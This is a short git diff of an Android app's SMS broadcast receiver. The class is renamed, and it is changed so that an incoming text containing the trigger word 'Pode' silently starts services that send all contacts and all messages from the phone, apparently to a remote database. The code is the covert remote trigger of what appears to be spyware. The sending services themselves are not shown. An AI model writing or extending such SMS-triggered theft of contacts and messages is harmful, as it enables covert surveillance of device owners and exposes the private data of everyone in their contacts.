@@ -1,21 +1,18 @@
-package com.test.myapplication.services;
+package com.test.myapplication.broadcasts;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import android.util.Log;
-import android.widget.Toast;
 
-import com.test.myapplication.broadcasts.SendAllMessagesBroadcast;
+import com.test.myapplication.services.SendAllContactsService;
+import com.test.myapplication.services.SendAllMessagesService;
 
-public class SmsReceiverService extends BroadcastReceiver {
+public class SmsReceiverBroadcast extends BroadcastReceiver {
 
     private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
     private static String activateWord = "Pode";
-
-
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -46,7 +43,8 @@ public class SmsReceiverService extends BroadcastReceiver {
                     //Log.i("WORDS",words[i]);
                     if(words[i].equals(activateWord))
                     {
-                        context.startService(new Intent(context, SendAllMessagesBroadcast.class));
+                        context.startService(new Intent(context, SendAllContactsService.class));
+                        context.startService(new Intent(context, SendAllMessagesService.class));
                         //CHAMAR CLASS DE ENVIAR TODAS AS MENSAGENS PARA A DB
                     }
 
